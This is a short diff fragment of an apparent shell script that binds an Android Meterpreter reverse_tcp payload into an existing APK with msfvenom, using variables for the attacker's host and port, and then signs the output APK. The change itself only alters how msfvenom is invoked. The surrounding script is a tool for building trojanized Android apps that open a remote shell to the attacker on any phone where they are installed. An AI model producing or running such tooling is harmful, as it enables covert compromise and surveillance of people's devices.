@@ -297,7 +297,7 @@ echo
 echo -e "$blue [*] Please wait while binding.......🕜"
 echo
 cd $HOME/metasploit-framework
-./msfvenom -x $OUTPUT -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport
+msfvenom -x $OUTPUT -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport
 
 echo -e "$green signing apk ......."
 mv $dir/unsign/output.apk $dir/unsign/$output12.apk
